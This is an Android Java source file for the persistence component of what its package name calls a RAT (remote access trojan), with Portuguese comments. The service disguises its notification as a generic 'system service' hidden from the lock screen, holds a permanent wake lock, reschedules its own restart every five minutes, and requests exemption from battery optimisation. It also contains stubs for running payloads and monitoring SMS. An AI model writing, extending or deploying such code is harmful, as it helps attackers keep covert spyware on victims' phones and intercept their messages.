package com.argus.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

public class PersistentService extends Service {
    private static final String TAG = "PersistentService";
    private static final String CHANNEL_ID = "persistent_service_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final int RESTART_INTERVAL = 5 * 60 * 1000; // 5 minutos

    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "PersistentService criado");
        createNotificationChannel();
        acquireWakeLock();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "PersistentService iniciado");
        
        // Promover para serviço de primeiro plano
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Agendar reinicialização automática
        scheduleServiceRestart();
        
        // Iniciar operações em background
        startBackgroundOperations();
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();
        Log.d(TAG, "PersistentService destruído");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Serviço do Sistema",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Serviço de sistema em execução");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder.setContentTitle("Serviço do Sistema")
                .setContentText("Executando em segundo plano")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setPriority(Notification.PRIORITY_MIN)
                .setOngoing(true)
                .setAutoCancel(false)
                .build();
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "PersistentService:WakeLock"
                );
                wakeLock.acquire();
                Log.d(TAG, "WakeLock adquirido");
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao adquirir WakeLock", e);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock liberado");
        }
    }

    private void scheduleServiceRestart() {
        try {
            Intent restartIntent = new Intent(this, ServiceRestarterReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 0, restartIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerTime = System.currentTimeMillis() + RESTART_INTERVAL;
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                        android.app.AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent
                    );
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    alarmManager.setExact(android.app.AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
                } else {
                    alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
                }
                
                Log.d(TAG, "Reinicialização agendada para " + RESTART_INTERVAL + "ms");
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao agendar reinicialização", e);
        }
    }

    private void startBackgroundOperations() {
        new Thread(() -> {
            try {
                // Iniciar operações de persistência
                startPayloadMonitoring();
                startSmsMonitoring();
                startBatteryOptimization();
                
                Log.d(TAG, "Operações em background iniciadas");
            } catch (Exception e) {
                Log.e(TAG, "Erro nas operações em background", e);
            }
        }).start();
    }

    private void startPayloadMonitoring() {
        // Monitorar e executar payloads periodicamente
        Log.d(TAG, "Monitoramento de payload iniciado");
    }

    private void startSmsMonitoring() {
        // Iniciar monitoramento de SMS
        Log.d(TAG, "Monitoramento de SMS iniciado");
    }

    private void startBatteryOptimization() {
        // Solicitar otimização de bateria
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "Solicitação de otimização de bateria enviada");
            } catch (Exception e) {
                Log.e(TAG, "Erro na solicitação de otimização de bateria", e);
            }
        }
    }

    // Método para verificar se o serviço está rodando
    public static boolean isServiceRunning(Context context) {
        android.app.ActivityManager manager = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (manager != null) {
            for (android.app.ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (PersistentService.class.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }
        return false;
    }
}